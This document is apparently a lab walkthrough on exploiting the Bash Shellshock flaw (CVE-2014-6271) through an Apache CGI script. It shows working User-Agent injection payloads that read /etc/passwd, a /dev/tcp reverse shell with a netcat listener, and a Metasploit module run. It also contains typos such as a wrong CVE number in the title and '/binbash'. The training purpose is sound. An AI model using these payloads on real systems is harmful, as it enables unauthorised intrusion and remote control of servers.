# Exploiting Bash CVE-20214-6271 Vulnerability (Shellshock)

- Shellshock (CVE-2014-6271) is s family of vulnerabilites in the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary commands via Bash, consequently allwing the attacker to obtain remote access to the target system via a reverse shell.
- The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: () {:;};.
- Only affects Linux (not Windows)
- In context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
- CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.
  
- In order to exploit this vulnerability, we need to locate a input vector or script that allows you to communicate with Bash
- In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.
- Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with bash.
- This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.

## Demo: Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)

### Manually

We want to get the target IP:

`ifconfig`

`namp -sV [target IP]`

Port 80, target IP is running a webserver. We can confirm this with the browser. The countdown is done by a CGI script. It executes the gettime.cgi script and we can access it because its in the root [targetip]/cgi.script. We can utilize this as our input vector. We can check if this system is vulnerable to our attack strategy:

`nmap -sV [target IP] --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`

Target is vulnerable and exploitable. Foxy Proxy allows to switch between Proxy's. We open BurpSuite and we use the default config:

Proxy -> Intercept ON -> We make a get request for the gettime.cgi script.

We are going to inject the special characters into the user agent http header. Send request to Repeater (rightclick) -> Repeater tab. We can replace the user agent information with our special characters. User Agent: `() { :; }; echo; echo; /binbash -c 'cat /etc/passwd'` To send this request: SEND. So it displays the output of this command in RESPONSE.

Getting reverse shell on target? We can utilize bash to connect to a listener to our kali linux system:

Listens to that port on the target system:

`nc -nvlp 1234`

We open Burpsuite, in REQUEST we replace our old command: `() { :; }; echo; echo; /binbash -c 'bash -i>&/dev/tcp/[target IP]/1234 0>&1'` SEND. we should get a reverse shell on our netcat listener. connection on target should be established:

We are logged in as the deamon@victim-1
`whoami`

enumerate info regarding the distro
`cat /etc/*issue`

gives us the kernel info
`uname -a`

### Automatically

service postgresql start && msfconsole

search shellshock

auxiliary module tells us if the target is vulnerable.

use exploit/multi/http/apache_mod_cgi_bash_env_exec

msf 5 exploit: show options

set rhosts [target IP]

We need to specify the targeturi, which is the path to the cgi script:

set targeturi /gettime.cgi

exploit

successfully obtained meterpreter session on the target.


node module

